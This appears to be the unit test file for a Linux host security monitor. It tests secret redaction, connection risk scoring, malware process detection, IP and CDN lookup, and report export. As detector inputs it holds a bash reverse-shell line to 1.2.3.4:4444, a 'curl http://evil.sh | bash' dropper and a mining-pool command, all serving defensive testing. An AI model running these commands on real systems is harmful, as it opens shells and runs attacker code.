#!/usr/bin/env python3
# SPDX-License-Identifier: MIT
# Copyright (c) 2024 linmon contributors
"""安全相关单元测试：脱敏、端口风险、地理风险、外发最小化。"""
import os
import sys
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from unittest import mock

from modules.ai_analyzer import redact_text, AIAnalyzer
from modules.geo_locator import (
    classify_port, is_private_ip, is_valid_public_ip,
    Zxipv6wryReader, CdnMatcher, GeoLocator, find_ipv6_db, find_cdn_yaml,
    cdn_lookup,
)
from modules.net_monitor import (_assess_connection_risk, configure_geo_risk,
                                 _extract_hostname_from_payload, get_all_connections)
from modules.proc_monitor import _detect_high_risk, _exe_is_deleted
from modules.report_exporter import export_markdown, export_pdf
from modules.health import build_health_report
from modules.runtime_identity import configure_monitor_identity, is_monitor_port

# 测试用样本库（由 ip.7z 提取的 ipv6wry.db 与 cdn.yml）
_SAMPLE_IPV6 = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
                            'data', 'ipv6wry.db')
_SAMPLE_CDN = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
                           'data', 'cdn.yml')


class TestRedact(unittest.TestCase):
    def test_bearer_token(self):
        self.assertNotIn('SECRET123', redact_text('Authorization: Bearer SECRET123'))

    def test_mysql_password(self):
        self.assertNotIn('p@ssw0rd', redact_text('mysql -uprod -pp@ssw0rd db'))

    def test_uri_creds(self):
        self.assertNotIn('passw0rd', redact_text('postgres://user:passw0rd@db:5432/a'))

    def test_key_value(self):
        self.assertNotIn('sk-123', redact_text('token=sk-1234567890abcdef'))

    def test_plain_text_untouched(self):
        self.assertEqual(redact_text('nginx worker process'), 'nginx worker process')


class TestIpClassification(unittest.TestCase):
    def test_private(self):
        self.assertTrue(is_private_ip('192.168.1.5'))
        self.assertTrue(is_private_ip('10.0.0.1'))
        self.assertTrue(is_private_ip('127.0.0.1'))

    def test_public(self):
        self.assertFalse(is_private_ip('8.8.8.8'))
        self.assertTrue(is_valid_public_ip('1.1.1.1'))
        self.assertFalse(is_valid_public_ip('192.168.0.1'))


class TestPortRisk(unittest.TestCase):
    def test_backdoor_port(self):
        level, reasons = _assess_connection_risk({
            'remote_ip': '1.2.3.4', 'remote_port': 4444, 'local_port': 1,
            'data_type_info': ('Metasploit', 'high'), 'direction': 'outbound',
            'process': '', 'state': 'ESTABLISHED', 'geo': {'geo_str': '未知'},
        })
        self.assertEqual(level, 'high')
        self.assertTrue(any('后门' in r for r in reasons))

    def test_normal_https_low(self):
        level, _ = _assess_connection_risk({
            'remote_ip': '1.2.3.4', 'remote_port': 443, 'local_port': 1,
            'data_type_info': ('HTTPS', 'low'), 'direction': 'outbound',
            'process': '', 'state': 'ESTABLISHED', 'geo': {'geo_str': '未知'},
        })
        self.assertEqual(level, 'low')

    def test_monitor_owned_listener_is_safe(self):
        level, reasons = _assess_connection_risk({
            'remote_ip': '0.0.0.0', 'remote_port': 0, 'local_port': 8765,
            'data_type_info': ('动态端口', 'low'), 'direction': 'listen',
            'process': 'python3', 'state': 'LISTEN', 'geo': {},
            'is_monitor_owned': True,
        })
        self.assertEqual(level, 'low')
        self.assertEqual(reasons, [])

    def test_runtime_identity_only_marks_registered_port(self):
        configure_monitor_identity(pid=os.getpid(), ports=[8765])
        self.assertTrue(is_monitor_port(8765))
        self.assertFalse(is_monitor_port(8766))

    def test_registered_monitor_port_is_annotated_without_pid(self):
        configure_monitor_identity(pid=os.getpid(), ports=[8765])
        raw = [{
            'protocol': 'tcp', 'state': 'LISTEN', 'local_ip': '127.0.0.1',
            'local_port': 8765, 'remote_ip': '0.0.0.0', 'remote_port': 0,
            'process': '', 'timer': '', 'skmem': '', 'inode': '', 'raw': '',
        }]
        with mock.patch('modules.net_monitor._run_ss_command', return_value=raw), \
                mock.patch('modules.net_monitor.IS_LINUX', False):
            conns = get_all_connections(include_internal=True)
        self.assertEqual(len(conns), 1)
        self.assertTrue(conns[0]['is_monitor_owned'])
        self.assertEqual(conns[0]['risk_level'], 'low')
        self.assertIn('监控程序自身', conns[0]['safety_note'])


class TestGeoRisk(unittest.TestCase):
    def tearDown(self):
        configure_geo_risk(False, [])

    def test_geo_risk_enabled(self):
        configure_geo_risk(True, ['美国'])
        level, reasons = _assess_connection_risk({
            'remote_ip': '1.2.3.4', 'remote_port': 443, 'local_port': 1,
            'data_type_info': ('HTTPS', 'low'), 'direction': 'outbound',
            'process': '', 'state': 'ESTABLISHED',
            'geo': {'geo_str': '美国 加利福尼亚', 'country': '美国'},
        })
        self.assertTrue(any('高风险地区' in r for r in reasons))

    def test_geo_risk_disabled_by_default(self):
        # 默认关闭，不应因地区产生风险
        level, reasons = _assess_connection_risk({
            'remote_ip': '1.2.3.4', 'remote_port': 443, 'local_port': 1,
            'data_type_info': ('HTTPS', 'low'), 'direction': 'outbound',
            'process': '', 'state': 'ESTABLISHED',
            'geo': {'geo_str': '美国 加利福尼亚', 'country': '美国'},
        })
        self.assertFalse(any('高风险地区' in r for r in reasons))


class TestBeginnerHealth(unittest.TestCase):
    def test_monitor_items_do_not_reduce_health(self):
        health = build_health_report(
            [{'risk_level': 'high', 'is_monitor_owned': True}],
            [{'risk_level': 'high', 'is_monitor_owned': True}],
        )
        self.assertEqual(health['score'], 100)
        self.assertEqual(health['level'], 'healthy')

    def test_real_high_risk_has_plain_language_action(self):
        health = build_health_report(
            [{'risk_level': 'high', 'is_monitor_owned': False, 'name': 'x', 'pid': 7}], [])
        self.assertEqual(health['level'], 'danger')
        self.assertLess(health['score'], 100)
        self.assertTrue(health['recommended_actions'])


class TestExternalSendMinimization(unittest.TestCase):
    def test_offline_blocks_send(self):
        a = AIAnalyzer()
        a.config['allow_external_ai'] = False
        self.assertFalse(a.is_external_allowed())
        r = a.generate_security_report([{'is_risky': True, 'risk_level': 'high', 'name': 'x', 'pid': 1}], [])
        self.assertTrue(r.get('offline'))

    def test_preview_summarizes_what_is_sent(self):
        a = AIAnalyzer()
        a.config['allow_external_ai'] = True
        a.config['send_internal_ips'] = False
        pv = a.preview_send(
            [{'is_risky': True, 'risk_level': 'high', 'name': 'x', 'pid': 1}],
            [{'risk_level': 'high', 'remote_ip': '1.2.3.4', 'remote_port': 4444}],
        )
        self.assertTrue(pv['allowed'])
        self.assertTrue(pv['will_send'])
        self.assertIn('命令行(已脱敏)', pv['fields'])
        self.assertNotIn('本机内网IP', pv['fields'])

    def test_prompt_hides_internal_ip_and_redacts_cmdline(self):
        a = AIAnalyzer()
        a.config['send_internal_ips'] = False
        a.config['redact_sensitive'] = True
        p = a._build_connection_prompt({
            'protocol': 'tcp', 'state': 'EST', 'direction': 'outbound',
            'local_ip': '192.168.1.5', 'local_port': 4444,
            'remote_ip': '1.2.3.4', 'remote_port': 443, 'data_type': 'HTTPS',
            'remote_os': 'Linux', 'geo': {'geo_str': '中国', 'lng': 1, 'lat': 2},
            'process': 'bash', 'pid': 9, 'process_cmdline': 'mysql -pp@ssw0rd',
            'process_user': 'alice', 'age_str': '1m', 'timer_info': '',
            'bytes_sent_str': '1B', 'bytes_recv_str': '1B',
            'frequency': {'frequency_desc': ''}, 'risk_reasons_str': '', 'risk_level': 'high',
        })
        self.assertNotIn('192.168.1.5', p)
        self.assertNotIn('p@ssw0rd', p)

    def test_tracking_ai_does_not_send_local_file_paths(self):
        a = AIAnalyzer()
        a.config.update({'enabled': True, 'app_key': 'test', 'allow_external_ai': True})
        report = {
            'tracking': {
                'process_name': 'demo', 'pid': 3, 'status': 'completed',
                'elapsed_seconds': 5, 'sample_count': 2,
                'files': {'unique_observed': 1, 'paths': ['/Users/alice/secret.txt']},
                'io_delta': {}, 'cpu': {},
                'network': {'endpoints': [{'remote': '1.2.3.4:443', 'public': True}]},
            },
            'concerns': [],
        }
        with mock.patch.object(a, '_call_ai', return_value={'success': True, 'analysis': 'ok'}) as call:
            a.analyze_tracking_report(report)
        prompt = call.call_args.args[0]
        self.assertNotIn('/Users/alice/secret.txt', prompt)
        self.assertIn('1.2.3.4:443', prompt)

    def test_weak_gateway_certificate_uses_restricted_tls_retry(self):
        import json as _json
        import urllib.error
        import ssl as _ssl

        a = AIAnalyzer()
        a.config.update({
            'enabled': True, 'app_key': 'test',
            'endpoint': 'https://ai.ctaigw.cn/v1/chat/completions',
            'legacy_tls_fallback': True,
        })

        class _Response:
            def __enter__(self): return self
            def __exit__(self, *args): return False
            def read(self):
                return _json.dumps({'choices': [{'message': {'content': '连接成功'}}]}).encode()

        error = urllib.error.URLError(
            _ssl.SSLCertVerificationError(1, 'EE certificate key too weak'))
        with mock.patch('modules.ai_analyzer.urllib.request.urlopen',
                        side_effect=[error, _Response()]) as urlopen:
            result = a._call_ai('test')
        self.assertTrue(result['success'])
        self.assertEqual(urlopen.call_count, 2)
        retry_context = urlopen.call_args_list[1].kwargs['context']
        self.assertTrue(retry_context.check_hostname)
        self.assertEqual(retry_context.verify_mode, _ssl.CERT_REQUIRED)

    def test_weak_certificate_fallback_is_host_scoped(self):
        import urllib.error
        import ssl as _ssl
        a = AIAnalyzer()
        a.config.update({
            'enabled': True, 'app_key': 'test',
            'endpoint': 'https://example.com/v1/chat/completions',
            'legacy_tls_fallback': True,
        })
        error = urllib.error.URLError(
            _ssl.SSLCertVerificationError(1, 'EE certificate key too weak'))
        with mock.patch('modules.ai_analyzer.urllib.request.urlopen', side_effect=error) as urlopen:
            result = a._call_ai('test')
        self.assertFalse(result['success'])
        self.assertEqual(urlopen.call_count, 1)


class TestMalwareDetection(unittest.TestCase):
    """多维恶意特征研判（名称 + 路径 + 命令行 + 哈希）测试。"""

    def _base(self, **kw):
        p = {
            'pid': 1234, 'ppid': 100, 'name': 'x', 'exe': '/usr/bin/x',
            'cmdline': '', 'username': 'alice', 'uid': 1000,
            'listening_ports': set(), 'network_connections': [],
            'category': 'unknown',
        }
        p.update(kw)
        return p

    def test_name_match_high(self):
        p = self._base(name='xmrig', category='malware')
        risky, level, reasons = _detect_high_risk(p)
        self.assertTrue(risky)
        self.assertEqual(level, 'high')
        self.assertTrue(any('恶意' in r for r in reasons))

    def test_reverse_shell_high(self):
        p = self._base(name='bash', cmdline='bash -i >& /dev/tcp/1.2.3.4/4444 0>&1')
        risky, level, reasons = _detect_high_risk(p)
        self.assertTrue(risky)
        self.assertEqual(level, 'high')
        self.assertTrue(any('反向' in r for r in reasons))

    def test_dropper_high(self):
        p = self._base(name='sh', cmdline='curl http://evil.sh | bash')
        risky, level, reasons = _detect_high_risk(p)
        self.assertTrue(risky)
        self.assertEqual(level, 'high')

    def test_mining_cmdline_high(self):
        p = self._base(name='python3', cmdline='./run --pool stratum+tcp://xmr.pool:3333 -u wallet')
        risky, level, reasons = _detect_high_risk(p)
        self.assertTrue(risky)
        self.assertEqual(level, 'high')
        self.assertTrue(any('矿池' in r for r in reasons))

    def test_root_exe_unreadable_flagged_when_scanner_root(self):
        # 扫描器本身为 root 时，root 进程 exe 不可读才是异常（降低漏报）
        p = self._base(name='weirdproc', username='root', uid=0, exe='', cmdline='')
        with mock.patch('modules.proc_monitor.os.geteuid', return_value=0, create=True):
            risky, level, reasons = _detect_high_risk(p)
        self.assertTrue(risky)
        self.assertTrue(any('root进程' in r for r in reasons))

    def test_root_exe_unreadable_not_flagged_when_nonroot(self):
        # 非特权扫描器下，root 进程 exe 不可读多为权限不足，不应误报
        p = self._base(name='weirdproc', username='root', uid=0, exe='', cmdline='')
        with mock.patch('modules.proc_monitor.os.geteuid', return_value=1000, create=True), \
                mock.patch('modules.proc_monitor._exe_is_deleted', return_value=False):
            risky, level, reasons = _detect_high_risk(p)
        self.assertFalse(risky)

    def test_deleted_binary_flagged(self):
        # 真正被删除却仍在运行的二进制：高置信，与扫描器权限无关
        p = self._base(name='weirdproc', username='root', uid=0, exe='', cmdline='')
        with mock.patch('modules.proc_monitor._exe_is_deleted', return_value=True):
            risky, level, reasons = _detect_high_risk(p)
        self.assertTrue(risky)
        self.assertTrue(any('已被删除' in r for r in reasons))

    def test_exe_is_deleted_helper(self):
        with mock.patch('modules.proc_monitor.os.readlink', return_value='/tmp/evil (deleted)'):
            self.assertTrue(_exe_is_deleted(1234))
        with mock.patch('modules.proc_monitor.os.readlink', return_value='/usr/bin/ok'):
            self.assertFalse(_exe_is_deleted(1234))
        with mock.patch('modules.proc_monitor.os.readlink', side_effect=OSError):
            self.assertFalse(_exe_is_deleted(1234))

    def test_normal_process_not_flagged(self):
        p = self._base(name='nginx', exe='/usr/sbin/nginx', username='www-data')
        risky, level, reasons = _detect_high_risk(p)
        self.assertFalse(risky)


@unittest.skipUnless(os.path.isfile(_SAMPLE_IPV6), '需要 data/ipv6wry.db (运行 linmon update)')
class TestIpv6Lookup(unittest.TestCase):
    def test_reader_loads_and_resolves(self):
        r = Zxipv6wryReader(_SAMPLE_IPV6)
        r.load()
        self.assertEqual(r._img[:4], b'IPDB')
        self.assertEqual(r._iplen, 8)
        # 阿里云 IPv6 段
        c, a = r.lookup('2408:400a:10::')
        self.assertTrue(c or a)
        # 本地/保留地址有记录
        self.assertIsInstance(r.lookup('fe80::1'), tuple)

    def test_v4_rejected(self):
        r = Zxipv6wryReader(_SAMPLE_IPV6)
        r.load()
        self.assertEqual(r.lookup('8.8.8.8'), ('', ''))


@unittest.skipUnless(os.path.isfile(_SAMPLE_CDN), '需要 data/cdn.yml (运行 linmon update)')
class TestCdnMatcher(unittest.TestCase):
    def test_load_and_suffix_match(self):
        cm = CdnMatcher()
        self.assertTrue(cm.load(_SAMPLE_CDN))
        self.assertIsNotNone(cm.lookup('a.b.akamai.net'))
        self.assertEqual(cm.lookup('a.b.akamai.net')['provider'], 'Akamai CDN')
        # cloudflare.net 命中；cloudflare.com 由内置覆盖层补充
        self.assertIsNotNone(cm.lookup('www.cloudflare.net'))
        self.assertIsNotNone(cm.lookup('www.cloudflare.com'))
        self.assertEqual(cm.lookup('www.cloudflare.com')['provider'], 'Cloudflare')
        self.assertIsNone(cm.lookup('example.com'))

    def test_longest_suffix_wins(self):
        cm = CdnMatcher()
        cm.load(_SAMPLE_CDN)
        # 同时匹配多级后缀时取最长
        r = cm.lookup('img.360cdn.com')
        self.assertEqual(r['provider'], '360 云 CDN (由奇虎 360 运营)')

    def test_overlay_coverage(self):
        cm = CdnMatcher()
        cm.load(_SAMPLE_CDN)
        # 内置覆盖层补充的常用大厂域名
        self.assertEqual(cm.lookup('img.qcloudcdn.com')['provider'], '腾讯云 CDN')
        self.assertEqual(cm.lookup('a.tencentcloud.com')['provider'], '腾讯云')
        self.assertEqual(cm.lookup('qcloud.com')['provider'], '腾讯云')
        self.assertEqual(cm.lookup('www.akamai.com')['provider'], 'Akamai CDN')
        # cdn.yml 已有项仍正常（myqcloud.com 已在 yaml 内）
        self.assertEqual(cm.lookup('a.b.myqcloud.com')['provider'], '腾讯云对象存储')


class TestSniExtraction(unittest.TestCase):
    def test_http_host_header(self):
        self.assertEqual(
            _extract_hostname_from_payload('GET / HTTP/1.1\r\nHost: www.example.com\r\n'),
            'www.example.com')
        # 带端口的 Host
        self.assertEqual(
            _extract_hostname_from_payload('Host: cdn.foo.net:8080\r\n'),
            'cdn.foo.net')

    def test_tls_sni_like(self):
        # tcpdump -A 中 ClientHello 的 SNI 以可读 ASCII 出现
        self.assertEqual(
            _extract_hostname_from_payload('.....0..0.xx.myqcloud.com....0.'),
            'xx.myqcloud.com')

    def test_no_domain(self):
        self.assertIsNone(_extract_hostname_from_payload(''))
        self.assertIsNone(_extract_hostname_from_payload('flags [P.] seq 1:20'))
        # 纯文本句子里的 "e.g." 不应被当作域名
        self.assertIsNone(_extract_hostname_from_payload('see e.g. note above'))


@unittest.skipUnless(os.path.isfile(_SAMPLE_IPV6) and os.path.isfile(_SAMPLE_CDN),
                     '需要 data/ipv6wry.db 与 data/cdn.yml (运行 linmon update)')
class TestGeoLocatorV6Cdn(unittest.TestCase):
    def tearDown(self):
        GeoLocator.close()

    def test_ipv6_lookup_enriched(self):
        g = GeoLocator.lookup_ip('2606:4700:4700::1111')
        self.assertTrue(g['geo_str'])
        self.assertIsNone(g.get('cdn'))  # 未提供主机名时无 CDN

    def test_ipv6_with_hostname_cdn(self):
        g = GeoLocator.lookup_ip('2606:4700:4700::1111', hostname='www.cloudflare.net')
        self.assertIsNotNone(g.get('cdn'))
        self.assertEqual(g['cdn']['provider'], 'Cloudflare')

    def test_ipv4_with_hostname_cdn(self):
        g = GeoLocator.lookup_ip('23.45.67.89', hostname='a.b.akamai.net')
        self.assertIsNotNone(g.get('cdn'))
        self.assertEqual(g['cdn']['provider'], 'Akamai CDN')

    def test_cdn_node_flagged(self):
        # 命中 CDN 时标记边缘节点并给出归属地不可靠提示
        g = GeoLocator.lookup_ip('23.45.67.89', hostname='img.myqcloud.com')
        self.assertIsNotNone(g.get('cdn'))
        self.assertTrue(g.get('cdn_node'))
        self.assertIn('边缘节点', g.get('geo_note', ''))

    def test_no_cdn_no_flag(self):
        g = GeoLocator.lookup_ip('23.45.67.89')
        self.assertIsNone(g.get('cdn'))
        self.assertFalse(g.get('cdn_node', False))
        self.assertNotIn('geo_note', g)


class TestDbUpdater(unittest.TestCase):
    def test_valid_db_set(self):
        from modules.db_updater import VALID_DB
        self.assertEqual(VALID_DB, {'qqwry', 'cdn', 'zxipv6wry'})

    def test_update_cdn_writes_file(self):
        from modules.db_updater import update_cdn
        import tempfile, shutil as _shutil
        tmp = tempfile.mkdtemp()
        sample = os.path.join(tmp, 'sample_cdn.yml')
        with open(sample, 'w', encoding='utf-8') as f:
            f.write('example-cdn.com:\n  name: 测试CDN\n  link: https://x\n')
        dest = os.path.join(tmp, 'cdn.yml')
        # 模拟下载：把样本复制为目标文件
        def _fake_download(url, d, timeout=60):
            _shutil.copyfile(sample, d)
            return True
        with mock.patch('modules.db_updater._http_download', side_effect=_fake_download), \
                mock.patch('modules.db_updater.CDN_URLS', [sample]):
            ok = update_cdn(data_dir=tmp)
        self.assertTrue(ok)
        self.assertTrue(os.path.isfile(dest))
        os.remove(dest)
        os.remove(sample)
        os.rmdir(tmp)


class TestReportExporter(unittest.TestCase):
    def _sample(self):
        return {
            'title': 'AI 综合安全报告',
            'timestamp': '2026-08-23 12:00:00',
            'target_type': 'overview',
            'target': '系统综合安全报告',
            'analysis': (
                '# 总体安全评估\n'
                '系统存在**中风险**项，需关注。\n\n'
                '## 高危项目清单\n'
                '1. 发现可疑进程 `xmrig`\n'
                '- 外连至境外 IP\n'
                '- 命中矿池特征\n\n'
                '```\n'
                'bash -i >& /dev/tcp/1.2.3.4/4444 0>&1\n'
                '```\n\n'
                '> 建议立即隔离并排查。\n\n'
                '---\n\n'
                '## 处置建议\n'
                '按优先级排序处理。'
            ),
        }

    def test_export_markdown(self):
        md = export_markdown(self._sample())
        self.assertIn('# AI 综合安全报告', md)
        self.assertIn('生成时间: 2026-08-23 12:00:00', md)
        self.assertIn('发现可疑进程', md)

    def test_export_pdf_is_valid(self):
        pdf = export_pdf(self._sample())
        self.assertIsInstance(pdf, bytes)
        self.assertTrue(pdf.startswith(b'%PDF'))
        # 中文/标题/列表/代码块都能进入 PDF 而不抛异常
        self.assertGreater(len(pdf), 500)


if __name__ == '__main__':
    unittest.main(verbosity=2)
